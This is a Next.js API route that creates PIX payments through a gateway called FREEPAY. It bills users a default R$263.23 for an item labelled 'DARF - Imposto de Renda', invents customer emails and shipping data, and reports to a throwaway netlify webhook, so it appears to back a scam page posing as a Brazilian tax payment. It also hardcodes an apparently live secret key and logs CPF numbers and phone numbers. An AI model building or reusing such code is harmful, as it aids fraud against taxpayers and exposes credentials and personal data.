import { type NextRequest, NextResponse } from "next/server"

// FREEPAY Configuration
const FREEPAY_SECRET_KEY = "sk_live_C4C97UanuShcerwwfBIWYnTdqthmTrh2s5hYXBntPdb8q3bL"
const FREEPAY_COMPANY_ID = "b16176ba-9c1c-49d1-ad5d-aa56ef88a05d"
const FREEPAY_API_URL = "https://api.freepaybr.com/functions/v1"

export async function POST(request: NextRequest) {
  try {
    const { amount, cpf, name, phone } = await request.json()
    
    // Validações obrigatórias
    if (!cpf) {
      return NextResponse.json({ 
        success: false, 
        error: "CPF é obrigatório" 
      }, { status: 400 })
    }

    if (!name) {
      return NextResponse.json({ 
        success: false, 
        error: "Nome é obrigatório" 
      }, { status: 400 })
    }

    if (!phone) {
      return NextResponse.json({ 
        success: false, 
        error: "Telefone é obrigatório" 
      }, { status: 400 })
    }

    console.log("[v0] Creating PIX payment with FREEPAY:", { cpf, name, phone, amount })

    // Limpar CPF (remover formatação)
    const cpfLimpo = cpf.replace(/\D/g, '')
    
    // Validar CPF
    if (cpfLimpo.length !== 11) {
      return NextResponse.json({ 
        success: false, 
        error: "CPF deve ter 11 dígitos" 
      }, { status: 400 })
    }
    
    // Limpar telefone (remover formatação)
    const phoneLimpo = phone.replace(/\D/g, '')
    
    // Validar telefone
    if (phoneLimpo.length < 10) {
      return NextResponse.json({ 
        success: false, 
        error: "Telefone deve ter pelo menos 10 dígitos" 
      }, { status: 400 })
    }
    
    // Usar o valor fornecido ou o padrão
    const finalAmount = amount || 263.23
    const amountInCents = Math.round(finalAmount * 100)

    // FREEPAY API Configuration
    const url = `${FREEPAY_API_URL}/transactions`
    
    // FREEPAY usa Basic Auth com SECRET_KEY:x
    const auth = 'Basic ' + Buffer.from(`${FREEPAY_SECRET_KEY}:x`).toString('base64')
    
    console.log("[v0] FREEPAY Auth header:", auth.substring(0, 30) + "...")
    console.log("[v0] FREEPAY URL:", url)

    // FREEPAY payload conforme documentação
    const payload = {
      paymentMethod: "PIX",
      amount: amountInCents,
      items: [{
        title: "DARF - Imposto de Renda",
        unitPrice: amountInCents,
        quantity: 1,
        externalRef: "darf-ir-2024"
      }],
      customer: {
        name: name,
        email: `cliente${cpfLimpo}@exemplo.com`,
        phone: phoneLimpo
      },
      shipping: {
        street: "Não informado",
        streetNumber: "0",
        complement: "",
        zipCode: "00000000",
        neighborhood: "Não informado",
        city: "Não informado",
        state: "SP"
      },
      postbackUrl: "https://e34asd.netlify.app/webhook/pagamentos",
      metadata: JSON.stringify({
        cpf: cpf,
        phone: phone,
        source: "Organico-x1",
        timestamp: new Date().toISOString()
      }),
      ip: "192.168.1.1"
    }

    console.log("[v0] FREEPAY payload:", payload)

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Authorization': auth,
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify(payload),
    })

    const responseText = await response.text()
    console.log("[v0] FREEPAY response status:", response.status)
    console.log("[v0] FREEPAY response body:", responseText)

    if (!response.ok) {
      console.log("[v0] FREEPAY error - Status:", response.status, "Response:", responseText)
      
      // Tentar extrair mensagem de erro da resposta
      let errorMessage = `FREEPAY error: ${response.status}`
      try {
        const errorData = JSON.parse(responseText)
        errorMessage = errorData.message || errorData.error || errorMessage
      } catch (e) {
        // Se não conseguir fazer parse, usar a resposta como string
        errorMessage = responseText || errorMessage
      }
      
      return NextResponse.json({
        success: false,
        error: errorMessage,
        provider: 'freepay'
      }, { status: response.status })
    }

    let transactionData
    try {
      transactionData = JSON.parse(responseText)
      console.log("[v0] PIX transaction created successfully:", transactionData)
    } catch (parseError) {
      console.log("[v0] Failed to parse FREEPAY response as JSON:", parseError)
      return NextResponse.json({
        success: false,
        error: "Resposta inválida da FREEPAY",
        provider: 'freepay'
      }, { status: 500 })
    }

    // Extrair dados PIX conforme documentação FREEPAY
    console.log("[v0] Full transaction data:", JSON.stringify(transactionData, null, 2))
    
    const pixData = transactionData.pix
    const pixCode = pixData?.qrcode
    const transactionId = transactionData.id
    const expirationDate = pixData?.expirationDate
    const customerData = transactionData.customer

    console.log("[v0] PIX data extracted:", { pixData, pixCode, transactionId, expirationDate })

    if (!pixCode) {
      console.log("[v0] No PIX QR code found in response:", transactionData)
      return NextResponse.json({
        success: false,
        error: "Código PIX não foi gerado pela FREEPAY",
        provider: 'freepay'
      }, { status: 500 })
    }

    // Calcular tempo de expiração (30 minutos se não especificado)
    const expiresAt = expirationDate || new Date(Date.now() + 30 * 60 * 1000).toISOString()

    // Gerar QR Code usando API online (sem dependências)
    let qrCodeImage = null
    try {
      // Usar API gratuita para gerar QR code
      const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${encodeURIComponent(pixCode)}`
      qrCodeImage = qrApiUrl
      console.log("[v0] QR Code URL generated successfully:", qrApiUrl)
    } catch (qrError) {
      console.log("[v0] Error generating QR Code URL:", qrError)
    }

    return NextResponse.json({
      success: true,
      pixCode: pixCode,
      qrCodeImage: qrCodeImage,
      amount: finalAmount,
      transactionId: transactionId,
      expiresAt: expiresAt,
      provider: 'freepay',
      status: transactionData.status || 'waiting_payment',
      customer: {
        name: customerData?.name || name,
        email: customerData?.email || `cliente${cpfLimpo}@exemplo.com`,
        phone: customerData?.phone || phoneLimpo
      },
      metadata: {
        cpf: cpf,
        phone: phone,
        source: 'Organico-x1',
        timestamp: new Date().toISOString()
      }
    })

  } catch (error) {
    console.error("[v0] Error creating FREEPAY PIX transaction:", error)
    
    // Log detalhado do erro para debugging
    if (error instanceof Error) {
      console.error("[v0] Error details:", {
        message: error.message,
        stack: error.stack,
        name: error.name
      })
    }
    
    return NextResponse.json(
      {
        success: false,
        error: error instanceof Error ? error.message : "Erro interno do servidor",
        provider: 'freepay',
        timestamp: new Date().toISOString()
      },
      { status: 500 }
    )
  }
}
